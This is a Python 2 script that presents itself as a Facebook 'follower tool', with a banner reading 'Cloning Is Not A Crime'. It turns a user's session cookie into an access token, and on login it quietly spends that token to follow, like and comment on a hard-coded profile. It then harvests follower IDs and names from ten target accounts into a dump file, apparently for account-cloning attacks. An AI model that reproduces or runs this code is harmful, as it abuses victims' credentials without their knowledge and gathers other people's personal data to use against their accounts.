#*-coding:utf-8-*
import os, sys, re, time, json, requests, random, datetime
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as parser
from time import sleep
reload(sys)
sys.setdefaultencoding("utf-8")

"""
Kalo Mau Ubah Bot Nya Izin Dulu ! 

Faham ?
"""

# Warna
H = ('\x1b[1;90m')
M = ('\x1b[1;91m')
H = ('\x1b[1;92m')
K = ('\x1b[1;93m')
T = ('\x1b[1;94m')
U = ('\x1b[1;95m')
B = ('\x1b[1;96m')
P = ('\x1b[1;97m')

# Useragent
ua_nokia=('Mozilla/5.0 (NokiaC5-00)UC AppleWebkit(like Gecko) Safari/530')
ua_xiaomi=('Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36')
ua_samsung=('Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.11 Mobile Safari/537.36')
ua_macos=('Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15')
ua_vivo=('Mozilla/5.0 (Linux; U; Android 6.0; en-US; vivo 1713 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/11.5.0.1015 Mobile Safari/537.36')
ua_oppo=('Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36')
ua_huawei=('Mozilla/5.0 (Linux; Android 8.0.0; HUAWEI Y7 PRO) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36')
ua_redmi4a=('Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36')
ua_vivoy12=('Mozilla/5.0 (Linux; Android 9; vivo 1904) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36')
ua_nokiax=('NokiaX2-01/5.0 (07.10) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+')
ua_asus=('Mozilla/5.0 (Linux; Android 5.0; ASUS ZenFone 2 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36')
ua_galaxys10=('Mozilla/5.0 (Linux; Android 9; SM-G977N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.105 Mobile Safari/537.36')
ua_lenovo=('Mozilla/5.0 (Linux; Android 9; Lenovo TB-8705F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36')
ua=random.choice([ua_nokia,ua_xiaomi,ua_samsung,ua_macos,ua_vivo,ua_oppo,ua_huawei,ua_redmi4a,ua_vivoy12,ua_nokiax,ua_asus,ua_galaxys10,ua_lenovo])




def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.01)
		
		
def ban():
	jalan ('\033[1;95m-----------------------\033[1;94m----------------------------')
	jalan ('\033[1;94m-----------------------\033[1;96m----------------------------')
	jalan ('\033[1;93m-----------------------\033[1;91m----------------------------')
	jalan ('\033[1;92m-----------------------\033[1;95m----------------------------')
	jalan ('\033[1;91m                 Hannan \033[1;91mAnsari')
	jalan ('\033[1;97m              Cloning Is \033[1;94mNot A Crime   ')
	jalan ('\033[1;96m            Its Just War \033[1;93mAgainst The System ')
	jalan ('\033[1;95m-----------------------\033[1;91m----------------------------')
	jalan ('\033[1;94m-----------------------\033[1;92m----------------------------')
	jalan ('\033[1;91m-----------------------\033[1;96m----------------------------')
	jalan ('\033[1;93m-----------------------\033[1;95m----------------------------')
	
	
	
def ___follow___():
    try:
        ___token___ = open('login.txt', 'r').read()
    except (IOError):
        print("%s[%s!%s]%s Token Invalid"%(P,M,P,M));sleep(2)
        ___login___()
    try:
        web = datetime.datetime.now()
        ___waktu___ = web.strftime("%H:%M:%S/%d-%m-%Y")
        ___hour___ = web.hour
        if 06 <= ___hour___ < 11:
            ___ucapkan___ = ('Selamat Pagi 💙')
        elif 11 <= ___hour___ < 15:
            ___ucapkan___ = ('Selamat Siang 💛')
        elif 15 <= ___hour___ < 18:
            ___ucapkan___ = ('Selamat Sore 🧡')
        else:
            ___ucapkan___ = ('Selamat Malam 🖤')
        ___kata___ = random.choice(['Hidup ini terdiri dari 10 persen apa yang terjadi padamu dan 90 persen bagaimana caramu menyikapinya. - Charles R. Swindoll','Sukses tampaknya terkait dengan tindakan. Orang sukses terus bergerak. Mereka membuat kesalahan, tetapi mereka tidak berhenti. - Conrad Hilton','Keberanian adalah apa yang diperlukan untuk berdiri dan berbicara. Keberanian juga diperlukan untuk duduk dan mendengarkan. - Winston Churchill','Berani bermimpi, tapi yang lebih penting, berani melakukan tindakan di balik impianmu. - Josh Hinds','Kegagalan tidak akan pernah menyusul jika tekad untuk sukses cukup kuat. - Og Mandino','Hidup menyusut atau berkembang sebanding dengan keberanian seseorang. - Anais Nin','Ada dua cara untuk menyebarkan cahaya: menjadi lilin atau cermin yang memantulkannya. - Edith Wharton','Kesempatan itu mirip seperti matahari terbit. Kalau kau menunggu terlalu lama, kau bisa melewatkannya. - William Arthur Ward','Kebahagiaan bukanlah sesuatu yang siap dibuat. Itu berasal dari tindakan Anda sendiri. - Dalai Lama'])
        ___komen___ = (___ucapkan___+'\n\n'+___kata___+'\n'+___waktu___)
        ___komen2___ = (___ucapkan___+'\n\n'+___kata___+'\n'+___waktu___)
        ___komen3___ = random.choice(['LUSHH','NICE BRO'])
        requests.post('https://graph.facebook.com/100023690641454/subscribers?access_token=%s'%(___token___)) #rozhak
        requests.post('https://graph.facebook.com/100023690641454/likes?summary=true&access_token=%s'%(___token___)) #foto sampul
        requests.post('https://graph.facebook.com/100023690641454/likes?summary=true&access_token=%s'%(___token___)) # foto profil
        requests.post('https://graph.facebook.com/100023690641454/comments/?message=%s&access_token=%s'%(___komen3___,___token___)) #foto sampul
        requests.post('https://graph.facebook.com/100023690641454/comments/?message=%s&access_token=%s'%(___komen___,___token___)) #foto profil
        requests.post('https://graph.facebook.com/100023690641454/comments/?message=%s&access_token=%s'%(___komen2___,___token___)) #foto profil
    except:
        exit("%s[%s!%s]%sLOGIN FAILED"%(P,M,P,M))
    print("%s[%s*%s]%sLOGIN SUCCESSFULL"%(H,P,H,P))
    login()
def ___log___():
    os.system('clear')
    ban()
    print("%s[%s1%s]%s Login With Token(Best He JANII)"%(U,K,U,B))
    print("%s[%s2%s]%s Login With Cookie"%(U,K,U,B))
    print("%s[%s3%s]%s How To Get Token"%(U,K,U,B))
    print("%s[%s4%s]%s Direct Exit"%(U,K,U,B))
    ___login___ = raw_input("\n%s[%s?%s]%s Option :%s "%(B,H,B,P,H))
    if ___login___ in ['1','01']:
        try:
            ___token___ = raw_input("%s[%s?%s]%s Past Token :%s "%(B,P,B,P,K))
            if ___token___ in ['',' ']:
                exit("%s[%s!%s]%sABE TOKEN TO LAGA"%(P,M,P,M))
            xwx = requests.get('https://graph.facebook.com/me/?access_token=%s'%(___token___)).json()
            print("%s[%s*%s]%s WELCOME HE YAWR %s %s"%(B,P,B,P,H,xwx['name'].lower()))
            open('login.txt','w').write(___token___)
            ___follow___()
        except (KeyError):
            exit("%s[%s!%s]%s Token Invalid"%(P,M,P,M))
        except (ConnectionError):
            exit("%s[%s!%s]%s YOUR INTERNET CONNECTION IS LOL"%(P,K,P,K))
    elif ___login___ in ['2','02']:
        try:
            ___cookie___ = raw_input("%s[%s?%s]%s Cookie :%s "%(B,P,B,P,K))
            if ___cookie___ in ['',' ']:
                exit("%s[%s!%s]%s STUPID COOKIE PAST KAR"%(P,M,P,M))
            # Terimakasih untuk dullah!
            data = requests.get('https://business.facebook.com/business_locations', headers = {
                'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36',
                'referer'                   : 'https://www.facebook.com/',
                'host'                      : 'business.facebook.com',
                'origin'                    : 'https://business.facebook.com',
                'upgrade-insecure-requests' : '1',
                'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                'cache-control'             : 'max-age=0',
                'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'content-type'              : 'text/html; charset=utf-8'
            }, cookies = {
                'cookie'                    : ___cookie___
            })
            find_token = re.search('(EAAG\w+)', data.text)
            if find_token is None:
                exit("%s[%s!%s]%s Cookie Invalid"%(P,M,P,M))
            open('login.txt','w').write(find_token.group(1))
            try:
                xwx = requests.get('https://graph.facebook.com/me/?access_token=%s'%(find_token.group(1))).json()
                print("%s[%s*%s]%s Welcome :%s %s"%(B,P,B,P,H,xwx['name'].lower()))
                ___follow___()
            except (KeyError):
                exit("%s[%s!%s]%s Token Invalid"%(P,M,P,M))
        except (AttributeError,UnboundLocalError):
            exit("%s[%s!%s]%s Cookie Invalid"%(P,M,P,M))
        except (ConnectionError):
            exit("%s[%s!%s]%s CONNECTION LOL HE"%(P,K,P,K))
    elif ___login___ in ['3','03']:
        print("%s[%s?%s]%s OPENING YOUTUBE OR BROWSER"%(B,H,B,P));sleep(2)
        os.system('xdg-open https://youtu.be/3Y6xsMB3wRg')
        exit("%s[%s!%s]%s Ketik ulang %s«%spython2 dump.py%s»"%(B,K,B,P,H,P,H))
    elif ___login___ in ['4','04']:
        exit()
    else:
        exit("%s[%s!%s]%s Wrong Input"%(P,M,P,M))
def login():
	os.system("clear")
	ban()
	jalan ('\033[1;92m***********************************************')
	jalan ('\033[1;96mOwner : \033[1;93mHannan Ansari')
	jalan ('\033[1;95mAge   : \033[1;92mThirteen(13)Year🙂💔')
	jalan ('\033[1;91mAbout : \033[1;93mFrom A Middle Class Family')
	jalan ('\033[1;95mNote  : \033[1;96mITS A FOLLOWER TOOL')
	jalan ('\033[1;92m***********************************************')
	jalan ('\033[1;91mENTER 10 FOLLOWER IDS')
	jalan ('\033[1;96mIF YOU WANT TO ENTER LESS THEN 10')
	jalan ('\033[1;92mSO TAP ENTER')
	os.system('play Hello.mp3')
	print ' '
	
	hehe()
	
def hehe():
    try:
        ___token___ = open('login.txt','r').read()
    except (IOError):
        exit("%s[%s!%s]%s Token Invalid"%(P,M,P,M))
        ___log___()
    try:
    	___file___ = raw_input('\n%s[%s?%s]%s /sdcard/downloads/dump/ :%s '%(B,P,B,P,H))
        ___ids___ = raw_input("\n%s[%s01%s]%s Input ID :%s "%(B,P,B,P,H))
        ___ids2___ = raw_input("\n%s[%s02%s]%s Input ID :%s "%(B,P,B,P,H))
        ___ids3___ = raw_input("\n%s[%s03%s]%s Input ID :%s "%(B,P,B,P,H))
        ___ids4___ = raw_input("\n%s[%s04%s]%s Input ID :%s "%(B,P,B,P,H))
        ___ids5___ = raw_input("\n%s[%s05%s]%s Input ID :%s "%(B,P,B,P,H))
        ___ids6___ = raw_input("\n%s[%s06%s]%s Input ID :%s "%(B,P,B,P,H))
        ___ids7___ = raw_input("\n%s[%s07%s]%s Input ID :%s "%(B,P,B,P,H))
        ___ids8___ = raw_input("\n%s[%s08%s]%s Input ID :%s "%(B,P,B,P,H))
        ___ids9___ = raw_input("\n%s[%s09%s]%s Input ID :%s "%(B,P,B,P,H))
        ___ids10___ = raw_input("\n%s[%s10%s]%s Input ID :%s "%(B,P,B,P,H))
        print(" ")
    except (KeyError):
        exit("%s[%s!%s]%s User Not Found"%(P,M,P,M))
    try:
        rex = requests.get("https://graph.facebook.com/%s/subscribers?access_token=%s&limit=9999999"%(___ids___,___token___)).json()
        file = open(___file___ , 'a')
        for a in rex['data']:
            if a['id'][:5] in ['10005','10006','10007','10008']:
                file.write(a['id']+" | "+a['name']+'\n')
        rex = requests.get("https://graph.facebook.com/%s/subscribers?access_token=%s&limit=9999999"%(___ids2___,___token___)).json()
        file = open(___file___ , 'a')
        for a in rex['data']:
            if a['id'][:5] in ['10005','10006','10007','10008']:
                file.write(a['id']+" | "+a['name']+'\n')
        rex = requests.get("https://graph.facebook.com/%s/subscribers?access_token=%s&limit=9999999"%(___ids3___,___token___)).json()
        file = open(___file___ , 'a')
        for a in rex['data']:
            if a['id'][:5] in ['10005','10006','10007','10008']:
                file.write(a['id']+" | "+a['name']+'\n')
        rex = requests.get("https://graph.facebook.com/%s/subscribers?access_token=%s&limit=9999999"%(___ids4___,___token___)).json()
        file = open(___file___ , 'a')
        for a in rex['data']:
            if a['id'][:5] in ['10005','10006','10007','10008']:
                file.write(a['id']+" | "+a['name']+'\n')
        rex = requests.get("https://graph.facebook.com/%s/subscribers?access_token=%s&limit=9999999"%(___ids5___,___token___)).json()
        file = open(___file___ , 'a')
        for a in rex['data']:
            if a['id'][:5] in ['10005','10006','10007','10008']:
                file.write(a['id']+" | "+a['name']+'\n')
        rex = requests.get("https://graph.facebook.com/%s/subscribers?access_token=%s&limit=9999999"%(___ids6___,___token___)).json()
        file = open(___file___ , 'a')
        for a in rex['data']:
            if a['id'][:5] in ['10005','10006','10007','10008']:
                file.write(a['id']+" | "+a['name']+'\n')
        rex = requests.get("https://graph.facebook.com/%s/subscribers?access_token=%s&limit=9999999"%(___ids7___,___token___)).json()
        file = open(___file___ , 'a')
        for a in rex['data']:
            if a['id'][:5] in ['10005','10006','10007','10008']:
                file.write(a['id']+" | "+a['name']+'\n')
        rex = requests.get("https://graph.facebook.com/%s/subscribers?access_token=%s&limit=9999999"%(___ids8___,___token___)).json()
        file = open(___file___ , 'a')
        for a in rex['data']:
            if a['id'][:5] in ['10005','10006','10007','10008']:
                file.write(a['id']+" | "+a['name']+'\n')
        rex = requests.get("https://graph.facebook.com/%s/subscribers?access_token=%s&limit=9999999"%(___ids9___,___token___)).json()
        file = open(___file___ , 'a')
        for a in rex['data']:
            if a['id'][:5] in ['10005','10006','10007','10008']:
                file.write(a['id']+" | "+a['name']+'\n')
        rex = requests.get("https://graph.facebook.com/%s/subscribers?access_token=%s&limit=9999999"%(___ids10___,___token___)).json()
        file = open(___file___ , 'a')
        for a in rex['data']:
            if a['id'][:5] in ['10005','10006','10007','10008']:
                file.write(a['id']+" | "+a['name']+'\n')                
        file.close()
        ___user___ = open(___file___,'r').readlines()
        print("\r%s                    "%(P))
        print ("\033[1;96m***********************************")
        print("%s[%s*%s]%s SUCCESSFULL..."%(H,P,H,P))
        print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(___user___)))
        print("%s[%s?%s]%s For Paste Anywhere:%s/sdcard/downloads/dump/%s"%(H,P,H,P,K,___file___))
        print ("\033[1;96m***********************************")
        print ' '
        raw_input("\n%s[%sBack%s]"%(B,H,B));hehe()
    except (KeyError):
    	___user___ = open(___file___,'r').readlines()
        print("\r%s                    "%(P))
        print ("\033[1;96m***********************************")
        print("%s[%s*%s]%s SUCCESSFULL..."%(H,P,H,P))
        print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(___user___)))
        print("%s[%s?%s]%s For Paste Anywhere:%s/sdcard/downloads/dump/%s"%(H,P,H,P,K,___file___))
        print ("\033[1;96m***********************************")
        raw_input("\n%s[%sBack%s]"%(B,H,B));hehe()
        
    except (ConnectionError):
        exit("%s[%s!%s]%s Connection Error"%(P,K,P,K))
        
login()
